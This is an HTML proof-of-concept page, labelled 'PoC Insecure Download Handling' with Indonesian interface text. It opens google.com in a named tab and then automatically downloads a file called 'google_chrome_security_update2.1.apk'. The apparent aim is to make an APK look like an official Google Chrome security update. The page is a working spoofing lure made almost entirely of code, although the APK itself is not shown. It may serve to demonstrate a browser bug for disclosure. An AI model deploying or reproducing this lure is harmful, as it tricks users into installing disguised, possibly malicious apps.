<!doctype html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>PoC Insecure Download Handling</title>
    <style>
      body {
        font-family: sans-serif;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background: #f0f0f0;
      }
      .btn {
        background-color: #4caf50;
        border: none;
        color: white;
        padding: 20px 40px;
        font-size: 18px;
        border-radius: 8px;
        cursor: pointer;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        margin: 10px;
        font-weight: bold;
      }
      .btn:active {
        background-color: #45a049;
        transform: translateY(2px);
      }
      #status {
        margin-top: 15px;
        color: #555;
        font-size: 14px;
      }
    </style>
  </head>
  <body>
    <button class="btn" onclick="triggerSpoof()">
      Download Update dari Google
    </button>
    <div id="status"></div>

    <script>
      function triggerSpoof() {
        const file = "google_chrome_security_update2.1.apk";
        document.getElementById("status").innerText = "Membuka spoof tab & menyiapkan download...";
        
        try {
          window.open("https://www.google.com", "spoof_tab");
        } catch(e) {}

        // Mengunduh file APK secara andal
        setTimeout(function () {
          const a = document.createElement("a");
          a.href = file;
          a.download = file;
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
          document.getElementById("status").innerText = "Download dimulai: " + file;
        }, 1500);
      }
    </script>
  </body>
</html>
